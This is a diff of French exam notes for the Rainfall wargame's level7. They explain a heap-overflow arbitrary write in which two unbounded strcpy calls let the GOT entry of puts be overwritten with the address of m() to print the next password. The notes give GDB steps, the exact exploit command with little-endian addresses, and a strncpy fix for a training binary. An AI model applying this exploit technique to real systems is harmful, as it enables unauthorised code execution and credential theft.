@@ -1,43 +1,110 @@
 # Level7 - Exam Notes
 
 ## 1. Objective
-Afficher le mot de passe level8. Le programme lit le mot de passe dans un buffer global **c** puis appelle puts("~~"). Il faut détourner un appel pour afficher **c** (ex. en remplaçant l’entrée GOT de puts par l’adresse de **m** qui fait printf avec c).
+Afficher le mot de passe level8. Le programme lit le mot de passe dans un buffer global **c** puis appelle puts("~~"). Il faut détourner un appel pour afficher **c** (ex. remplacer l’entrée GOT de puts par l’adresse de **m** qui fait printf avec c).
 
-## 2. Initial diagnosis (before GDB)
-- **Fonctions suspectes :** deux `strcpy` : strcpy(ptr1[1], argv[1]) et strcpy(ptr2[1], argv[2]) sans limite. ptr1[1] et ptr2[1] pointent vers des blocs de 8 octets. Layout heap : [bloc1][bloc2][bloc3][bloc4]. En dépassant 8 octets dans bloc2 (ptr1[1]), on écrase bloc3 = **ptr2[0]** et **ptr2[1]** (destination du 2e strcpy). Donc on contrôle **où** argv[2] est écrit (arbitrary write).
-- **Entrée utilisateur :** argv[1] et argv[2].
-- **Succès :** faire afficher le buffer c (où fgets a lu le mot de passe). **m()** (0x80484f4) fait printf avec c. En écrasant la **GOT de puts** (0x8049928) par l’adresse de m, l’appel à puts("~~") exécutera m() → affichage de c.
-- **Hypothèse :** overflow argv[1] pour mettre ptr2[1] = GOT puts ; argv[2] = adresse de m. Le 2e strcpy écrit alors m dans la GOT.
+## 2. Copy the binary (extraction)
+Depuis l’hôte :
+```bash
+sshpass -p '<level7_password>' scp -o StrictHostKeyChecking=no -P 4242 level7@localhost:level7 ./level7.bin
+```
+Référence : `commands.md`, Recon / Extraction.
 
-## 3. GDB diagnosis (how the vulnerability was found)
-- **Où break :** après les deux strcpy, avant fopen/puts. But : vérifier que ptr2[1] pointe vers 0x8049928 et que la GOT contient 0x080484f4.
-- **Layout heap :** ptr1 = malloc(8), ptr1[1] = malloc(8) (bloc2) ; ptr2 = malloc(8), ptr2[1] = malloc(8) (bloc4). Bloc2 fait 8 octets (ou plus avec en-tête). En écrivant 20 octets dans bloc2 (argv[1] = 20 octets + 4 octets adresse), on écrase le début de bloc3 : ptr2[0] et ptr2[1]. Les 4 derniers octets de argv[1] deviennent la nouvelle valeur de ptr2[1]. Donc argv[1] = [20 octets] + [0x8049928] pour que ptr2[1] = GOT puts. **Offset 20** sur Rainfall (à confirmer : 8+8+padding).
-- **Adresses :** GOT puts : `readelf -r` ou `x/wx` après résolution → **0x8049928**. m : **0x080484f4**.
-- **Contrôle du flux :** après les strcpy, strcpy(ptr2[1], argv[2]) écrit argv[2] à 0x8049928. Si argv[2] = "\xf4\x84\x04\x08", la GOT contient 0x080484f4. Au call puts, le programme saute vers m() qui affiche c. Vérifier : `x/wx 0x8049928` après exploit = 0x080484f4.
+## 3. Binary-to-source translation (source reconstruction)
+- **main :** deux structures (ptr1, ptr2) avec malloc(8) chacune, et ptr1[1], ptr2[1] pointent vers des blocs de 8 octets. **strcpy(ptr1[1], argv[1])** et **strcpy(ptr2[1], argv[2])** sans limite. Ensuite fopen(".pass"), fgets(c, ...), puis **puts** (adresse en dur). **m()** fait printf avec le buffer **c**.
+- **Où ça peut casser :** le premier strcpy remplit le bloc ptr1[1] (8 octets). En dépassant, on écrase la zone suivante en mémoire (bloc suivant = ptr2[0] et ptr2[1]). Donc on contrôle **ptr2[1]** = destination du second strcpy. Si on met **GOT de puts** dans ptr2[1] et **adresse de m** dans argv[2], le second strcpy écrit l’adresse de m dans la GOT → puts("~~") appellera m() et affichera c.
+- Source : voir `source.c` / `source.md`.
 
-## 4. Building the exploit command
-- **Cible :** ptr2[1] (destination du 2e strcpy) = GOT puts = 0x8049928 ; contenu à écrire à cette adresse = adresse de m = 0x080484f4 (argv[2]).
-- **Structure :** argv[1] = [20 octets padding] + [\x28\x99\x04\x08] (4 octets). argv[2] = [\xf4\x84\x04\x08] (4 octets + \0 par strcpy). Les 20 octets remplissent bloc2 et écrasent ptr2[0]/ptr2[1] ; les 4 derniers octets de argv[1] = nouvelle ptr2[1] = GOT.
-- **Encodage :** adresses en LE. Python : argv[1] `"A"*20 + "\x28\x99\x04\x08"`, argv[2] `"\xf4\x84\x04\x08"`.
-- **Invocation :** `./level7 "$(python -c '...')" "$(python -c '...')"`.
-- **Référence commands.md :** section Exploitation. Offset 20 et adresses GOT/m viennent du diagnostic GDB.
+## 4. Understanding where it can break (vulnerability hypothesis)
+- **Fonctions suspectes :** deux strcpy sans limite ; le premier overflow permet de contrôler la **destination** du second (arbitrary write).
+- **Succès :** afficher le buffer c. m() fait exactement ça. En écrasant la GOT de puts par l’adresse de m, l’appel à puts exécute m().
+- **Hypothèse :** argv[1] = padding + adresse GOT puts (pour que ptr2[1] = GOT) ; argv[2] = adresse de m (4 octets). Offset à mesurer en GDB (souvent 20 sur Rainfall : 8 + 8 + padding).
 
-## 5. Exploitation logic
-Arbitrary write : en overflowant ptr1[1], on écrase ptr2[1]. Le 2e strcpy écrit argv[2] à l’adresse qu’on a mise dans ptr2[1] (GOT puts). On y écrit l’adresse de m ; puts("~~") appelle alors m() qui affiche le buffer c (mot de passe).
+## 5. GDB diagnosis step-by-step
 
-## 6. Reproducible procedure (for evaluation)
-- **Commande :** `./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`. Sortie : "(mot de passe) - (timestamp)".
-- **Résultat attendu :** le mot de passe level8 s’affiche (avec un timestamp).
+1. **Lancer GDB**  
+   ```bash
+   gdb -q ./level7.bin
+   ```
+
+2. **Repérer les strcpy et le layout**  
+   ```gdb
+   disas main
+   ```  
+   Noter les deux appels strcpy et l’ordre des allocations. Après le second strcpy, mettre un breakpoint pour inspecter ptr2[1] et la GOT.
+
+3. **Adresses GOT et m**  
+   ```gdb
+   readelf -r level7.bin
+   ```  
+   Repérer la reloca pour puts → **GOT puts = 0x8049928**.  
+   ```gdb
+   info functions m
+   ```  
+   **m = 0x080484f4**.
+
+4. **Breakpoint après les deux strcpy**  
+   ```gdb
+   break *<adresse_après_2e_strcpy>
+   run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+   ```  
+   Vérifier que ptr2[1] pointe vers 0x8049928 (regard sur la stack/heap selon où ptr2 est stocké). Puis :  
+   ```gdb
+   x/wx 0x8049928
+   ```  
+   Doit valoir **0x080484f4** (adresse de m). Cela prouve que le second strcpy a bien écrit à la GOT.
+
+5. **Mesurer l’offset**  
+   Si 20 octets ne suffisent pas, tester 16, 24. L’offset est : nombre d’octets dans argv[1] avant les 4 octets qui écrasent ptr2[1]. Sur Rainfall **20** (8 octets bloc2 + 8 octets ptr2[0] + 4 de padding ou layout). Le confirmer en comparant avec le layout : `x/20wx` sur l’adresse du premier bloc, etc.
+
+6. **Contrôle du flux**  
+   Continuer l’exécution : au call puts, le programme doit sauter vers m() et afficher (mot de passe) - (timestamp). Cela prouve le GOT hijack.
+
+## 6. Exploit design and command explanation
+
+**Génération de la commande (converter.py) :**  
+`level7/converter.py` prend l’offset (20), l’adresse GOT puts (0x8049928) et l’adresse de **m** (0x080484f4) et affiche la commande finale. Entrées : valeurs trouvées en GDB / readelf (section 5).
+
+**Conception :** Arbitrary write : en overflowant ptr1[1], on écrase ptr2[1]. Le second strcpy écrit argv[2] à l’adresse qu’on a mise dans ptr2[1]. On choisit **GOT puts** comme destination et **adresse de m** comme valeur → puts("~~") appelle m() qui affiche c.
+
+**Commande finale (`commands.md`, Exploitation) :**
+```bash
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+**Décomposition :**
+
+- **Invocation :** deux arguments ; pas de stdin à garder.
+
+- **argv[1] — Partie 1 : 20 octets 'A' (padding)**  
+  - Remplissent le bloc ptr1[1] (8 octets) et débordent pour écraser ptr2[0] et **ptr2[1]** (destination du 2ᵉ strcpy). Les 4 derniers octets de argv[1] deviennent la nouvelle valeur de ptr2[1].  
+  - 20 = offset trouvé en GDB sur Rainfall (8+8+4 ou équivalent).
+
+- **argv[1] — Partie 2 : 4 octets = adresse GOT puts**  
+  - Adresse : **0x8049928**.  
+  - Little-endian : 28, 99, 04, 08 → `\x28\x99\x04\x08`.  
+  - Rôle : ptr2[1] = 0x8049928 → le second strcpy écrit **à cette adresse** (la GOT de puts).
+
+- **argv[2] : 4 octets = adresse de m**  
+  - Adresse : **0x080484f4**.  
+  - Little-endian : f4, 84, 04, 08 → `\xf4\x84\x04\x08`.  
+  - Rôle : c’est ce que strcpy écrit dans la GOT. Donc l’entrée GOT de puts devient 0x080484f4 ; au prochain call puts, le programme exécute m() et affiche c (mot de passe).
+
+Résumé : **20×'A'** + **\x28\x99\x04\x08** = ptr2[1] pointe vers la GOT ; **\xf4\x84\x04\x08** = valeur écrite (m) → puts exécute m() → mot de passe affiché.
+
+## 7. Reproducible procedure (for evaluation)
+- **Commande :** `./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`.
+- **Résultat attendu :** une ligne "(mot de passe) - (timestamp)" ; le mot de passe level8 est la première partie.
 - **À dire :** « Le premier strcpy overflow et écrase ptr2[1]. Je mets la GOT de puts dans ptr2[1] et l’adresse de m dans argv[2]. Le second strcpy écrit m dans la GOT ; puts appelle alors m() qui affiche c. »
 
-## 7. Oral defense points
-- **Bug :** strcpy(ptr1[1], argv[1]) sans limite ; en dépassant 8 octets on écrase ptr2[1], donc la destination du 2e strcpy.
-- **GDB :** offset 20, GOT puts 0x8049928, m 0x080484f4 ; après exploit la GOT contient l’adresse de m.
-- **Payload :** argv[1] = padding + GOT puts ; argv[2] = adresse de m.
-- **Fix :** borner les strcpy (strncpy) ; ne pas faire dépendre la sécurité de l’ordre des allocations.
+## 8. Oral defense points
+- **Bug :** strcpy(ptr1[1], argv[1]) sans limite ; en dépassant 8 octets on écrase ptr2[1], donc la destination du 2ᵉ strcpy.
+- **GDB :** offset 20, GOT puts 0x8049928, m 0x080484f4 ; après exploit la GOT contient 0x080484f4.
+- **Payload :** argv[1] = padding + GOT puts (LE) ; argv[2] = adresse de m (LE).
+- **Fix :** borner les strcpy (strncpy).
 
-## 8. Common evaluator questions
-- **Pourquoi la GOT de puts ?** Le programme appelle puts("~~") après avoir lu le mot de passe dans c ; en remplaçant cette entrée par m(), l’appel affiche c.
-- **Pourquoi 20 octets ?** Taille du bloc ptr1[1] (8) + champ ptr2[0] (4) + padding pour que les 4 derniers octets de argv[1] écrasent ptr2[1]. Valeur trouvée en GDB sur Rainfall.
-- **Où est le mot de passe ?** Lu par fgets dans le buffer global c (0x8049960).
+## 9. Common evaluator questions
+- **Pourquoi la GOT de puts ?** Le programme appelle puts("~~") après avoir lu le mot de passe ; en remplaçant cette entrée par m(), l’appel affiche c.
+- **Pourquoi 20 octets ?** Taille pour que les 4 derniers octets de argv[1] écrasent ptr2[1] ; trouvé en GDB (layout heap).
+- **Little-endian de 0x8049928 et 0x080484f4 ?** 28 99 04 08 et f4 84 04 08 → \x28\x99\x04\x08 et \xf4\x84\x04\x08.
 - **Arbitrary write ?** Oui : on choisit l’adresse (ptr2[1]) où strcpy écrit argv[2].
